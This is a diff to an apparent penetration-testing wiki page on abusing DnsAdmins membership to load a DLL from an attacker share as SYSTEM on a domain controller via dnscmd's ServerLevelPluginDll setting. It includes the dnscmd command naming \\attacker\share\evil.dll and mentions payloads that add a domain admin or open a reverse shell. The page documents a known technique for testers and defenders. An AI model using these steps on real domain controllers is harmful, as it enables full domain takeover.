@@ -15,31 +15,27 @@ Members of **DnsAdmins** manage the DNS server, and the Microsoft DNS service ex
 
 ## The attack
 
+`ServerLevelPluginDll` is a **DNS server property** set through the DNS management RPC (it is not an AD LDAP attribute), so `dnscmd` is the native way to set it; the gate is write access to that property, which DnsAdmins, or a DACL on the DNS server object, grants:
+
 ```bash
-# Set the plugin DLL to an attacker share (dnscmd, from a member of DnsAdmins)
+# From a DnsAdmins member: point the plugin DLL at an attacker share
 dnscmd <dc> /config /serverlevelplugindll \\attacker\share\evil.dll
-
-# Or write the attribute over LDAP (no dnscmd needed), then restart DNS
-# the value lands at HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll
-
-# Restart the DNS service to load the DLL as SYSTEM
-sc.exe \\<dc> stop dns && sc.exe \\<dc> start dns
 ```
 
-The DLL only needs to export **`DnsPluginInitialize`** (and the other plugin entry points); your payload runs from there as SYSTEM. A common payload adds a domain admin or runs a reverse shell, after which you clean the `ServerLevelPluginDll` value and restart DNS to restore service.
+The DLL only needs to export **`DnsPluginInitialize`** (and the other plugin entry points); your payload runs from there as SYSTEM. The catch is that the DLL loads only when the **DNS service restarts**, and default DnsAdmins members **cannot** stop/start the service remotely. So you either wait for a legitimate restart (or host reboot), pair with a service-control right ([Server Operators](server-operators.md)), or use the DNS-management RPC reload that Semperis documented (which has operational side effects). Afterwards, clear the `ServerLevelPluginDll` value and let DNS restart to restore service.
 
 ## Exploitation notes
 
-- The gate is the **DNS service restart**: DnsAdmins can usually restart it; if not, a reboot or another restart path (Server Operators) is needed. Pair accordingly.
+- The gate is the **DNS service restart**, and default DnsAdmins members **cannot** restart it remotely; wait for a restart or reboot, use a service-control right ([Server Operators](server-operators.md)), or the documented DNS-RPC reload. Pair accordingly.
 - An invalid or crashing DLL breaks DNS for the domain, which is disruptive and noisy, so test the DLL and restore the config promptly.
 - This is a classic "almost-DA" group to hunt for in [ACL enumeration](acl-enumeration.md) / BloodHound; DnsAdmins is frequently handed out to helpdesk or server teams.
 - The same `serverLevelPluginDll` write is reachable through any [DACL edge](index.md) that lets you modify the DNS server object, not only group membership.
 
 ## Tools
 
-- **dnscmd**: native, sets `ServerLevelPluginDll`.
-- **Impacket / PowerView**: write the attribute over LDAP, and manage the service restart remotely.
-- **NetExec / sc.exe**: restart the DNS service on the DC.
+- **dnscmd**: native, sets `ServerLevelPluginDll` via the DNS management RPC.
+- **dnsserver RPC tooling** (for example `dnsserver.py`-style clients): set the plugin DLL remotely.
+- **A separate service-restart right (Server Operators) or a host reboot**: load the DLL (default DnsAdmins cannot restart the service).
 
 ## References
 
